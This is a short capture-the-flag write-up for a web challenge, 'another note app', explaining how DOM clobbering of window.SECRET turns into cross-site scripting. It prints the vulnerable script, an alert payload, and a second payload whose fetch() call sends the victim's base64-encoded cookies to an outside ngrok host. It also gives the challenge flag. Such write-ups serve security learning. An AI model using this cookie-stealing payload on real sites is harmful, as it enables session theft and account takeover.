# another note app

## Write-up (brief)

The attack is called DOM clobbering, the goal is to inject a seamingly harmless HTML tag with id `SECRET` so that `window.SECRET` becomes controllable in `js/secret.js` :

```javascript
var secret = window.SECRET || {
  hidden: true,
  value: "<img src=xss onerror=alert(1)>"
}

if (secret.hidden === false) {
  var output = document.getElementById("output")
  if (output !== null) {
    output.innerHTML += secret.value
  }
}
```

We need to set `SECRET.hidden` to `false` and `SECRET.value` to our XSS payload. We can do that by using the `input` tag for example, and with trial and error we can notice that omitting the `hidden` attribute makes `SECRET.hidden` `false`, so now we only need to put the XSS payload inside `SECRET.value`.

### Alert

- **Payload:** `<input id=SECRET value="<img src=xss onerror=alert(document.domain)>" />`
- **URL:** <http://another-note-app.web.ctf.shellmates.club/?note=%3Cinput+id%3DSECRET+value%3D%22%3Cimg+src%3Dxss+onerror%3Dalert%28document.domain%29%3E%22+%2F%3E>

### Get flag

- **Payload:** `<input id=SECRET value="<img src=xss onerror=fetch('http://f789-105-235-130-219.ngrok.io?a='+btoa(document.cookie))>" />`
- **URL:** <http://another-note-app.web.ctf.shellmates.club/?note=%3Cinput+id%3DSECRET+value%3D%22%3Cimg+src%3Dxss+onerror%3Dfetch%28%27http%3A%2F%2Ff789-105-235-130-219.ngrok.io%3Fa%3D%27%2Bbtoa%28document.cookie%29%29%3E%22+%2F%3E>

## Flag

`shellmates{U_c4nT_puRifY_4_Cl0Bb3R3D_DOM}`
